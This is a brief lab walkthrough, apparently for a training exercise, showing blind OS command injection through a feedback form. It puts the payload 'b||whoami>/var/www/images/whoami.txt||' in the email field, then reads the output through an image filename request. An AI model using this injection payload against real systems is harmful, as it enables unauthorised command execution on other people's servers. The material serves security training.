Intercept the request using `BurpSuite` and then `Modify` the request that submits feedback:

Modify the email address changing it to:
```
b||whoami>/var/www/images/whoami.txt||
```
Next, intercept the request that contains an image and modify the filname in the request:
```
GET /image?filename=whoami.txt HTTP/1.1
```
